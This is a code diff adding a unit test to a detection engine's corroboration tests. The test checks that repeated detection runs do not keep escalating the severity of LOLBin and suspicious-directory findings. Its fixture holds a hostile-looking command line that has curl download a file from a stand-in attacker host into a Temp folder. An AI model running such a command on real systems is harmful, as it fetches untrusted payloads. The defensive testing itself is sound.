@@ -100,6 +100,27 @@ class CorroborationTests(_Base):
         self.assertEqual(by_title.get("LOLBin activity: curl.exe"), "medium")
         self.assertEqual(by_title.get("Execution from suspicious directory: curl.exe"), "medium")
 
+    def test_corroboration_is_idempotent_across_reruns(self) -> None:
+        # The ingest/memory pipelines re-run detections without wiping findings;
+        # re-running must not compound the escalation (low+low -> medium, forever).
+        s = self._session()
+        try:
+            s.add(Process(
+                pid=4321, ppid=None, name="curl.exe",
+                path=r"C:\Users\v\AppData\Local\Temp\curl.exe",
+                cmdline="curl.exe https://evil.example/x -o x", session_id="live",
+                flags=[], severity="info",
+            ))
+            s.commit()
+        finally:
+            s.close()
+        engine.run_detections_sync(self.cid)
+        engine.run_detections_sync(self.cid)
+        engine.run_detections_sync(self.cid)
+        by_title = {t: sev for t, sev in self._findings()}
+        self.assertEqual(by_title.get("LOLBin activity: curl.exe"), "medium")
+        self.assertEqual(by_title.get("Execution from suspicious directory: curl.exe"), "medium")
+
     def test_lone_low_finding_stays_low(self) -> None:
         s = self._session()
         try:
